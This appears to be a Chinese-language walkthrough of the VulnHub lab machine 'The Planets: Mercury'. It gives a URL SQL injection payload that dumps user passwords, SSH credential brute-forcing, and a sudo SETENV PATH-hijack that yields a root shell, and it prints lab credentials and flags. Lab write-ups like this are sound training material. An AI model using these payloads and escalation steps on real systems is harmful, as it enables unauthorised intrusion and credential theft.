# The Planets: Mercury

2024-6-12 https://www.vulnhub.com/entry/the-planets-mercury,544/

difficulty: Easy

## IP

192.168.5.38

## Scan

Open Port -> 22,8080

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c824ea2a2bf13cfa169465bdc79b6c29 (RSA)
|   256 e808a18e7d5abc5c66164824570dfab8 (ECDSA)
|_  256 2f187e1054f7b917a2111d8fb330a52a (ED25519)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
|_http-server-header: WSGIServer/0.2 CPython/3.8.2
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Date: Tue, 11 Jun 2024 14:43:28 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 2366
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Tue, 11 Jun 2024 14:43:28 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Content-Length: 69
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Hello. This site is currently in development please check back later.
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

直接看 8080 端口，WSGIServer/0.2 CPython/3.8.2

gobuster 没有爆出可利用路径，打开主页链接，源码也没有详细信息，在首页链接后添加内容，发现出现错误：

```
http://192.168.5.38:8080/1

Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:

[name='index']
robots.txt [name='robots']
mercuryfacts/
The current path, 1, didn't match any of these.
```

发现有几个预定义的路径 http://192.168.5.38:8080/mercuryfacts/ 这个路径有意思。

点开其中第一个链接 http://192.168.5.38:8080/mercuryfacts/1/ 显示内容：

```
Fact id: 1. (('Mercury does not have any moons or rings.',),)
```

修改 1 变为 2，发现显示的内容也随之变化，这里可能存在模板注入，前面发现了是 Django，找到它的模板注入的 exp

`http://192.168.5.38:8080/mercuryfacts/{{ 7*7 }}/` 这里直接页面上出现报错信息，发现这里有 sql 报错：

```
SELECT fact FROM facts WHERE id = ' + fact_id
```

应该是存在 sql 注入，可以把全部信息爆出：

```
http://192.168.5.38:8080/mercuryfacts/-1%20or%201=1--%20-/
```

通过一些列操作，找到数据库名为 mercury, 有 2 个数据表: facts,users 看样子我们需要的内容就在 users 表中，查询 users 表的数据列 id,password,username，查询数据，得到 username 和 password:

```
john:johnny1987
laura:lovemykids111
sam:lovemybeer111
webmaster:mercuryisthesizeof0.056Earths
```

将得到的用户名和密码，用 crackmapexec 爆破 ssh 服务，最后发现 webmaster:mercuryisthesizeof0.056Earths 可以登陆，进行登陆。

发现 user flag：

```
webmaster@mercury:~$ cat user_flag.txt
[user_flag_8339915c9a454657bd60ee58776f4ccd]
```

在文件夹 mercury_proj 下发现提示信息：

```
webmaster@mercury:~/mercury_proj$ cat notes.txt
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

发现了另外一个凭据 linuxmaster:mercurymeandiameteris4880km 尝试切换到这个用户

sudo -l 发现:

```
(root : root) SETENV: /usr/bin/check_syslog.sh
```

查看权限：

```
linuxmaster@mercury:~$ ls -al /usr/bin/check_syslog.sh
-rwxr-xr-x 1 root root 39 Aug 28  2020 /usr/bin/check_syslog.sh

linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh
#!/bin/bash
tail -n 10 /var/log/syslog
```

sudo -u root /usr/bin/check_syslog.sh 可以查看 /var/log/syslog，但是 tail 没有使用绝对路径，并且 sudo 中有 SETENV ，相当于可以设定 env 进行提权。

SETENV 会允许用户禁用 env_reset 选项，允许 sudo 使用当前用户命令行中重置环境变量:

```
cp /usr/bin/vim /tmp/tail
export PATH=/tmp:$PATH
sudo --preserve-env=PATH /usr/bin/check_syslog.sh
:!/bin/bash
```

这样就得到了 root 权限：

```
root@mercury:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@mercury:/tmp# cd /root
root@mercury:~# ls
root_flag.txt
root@mercury:~# cat root_flag.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Congratulations on completing Mercury!!!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_69426d9fda579afbffd9c2d47ca31d90]
```
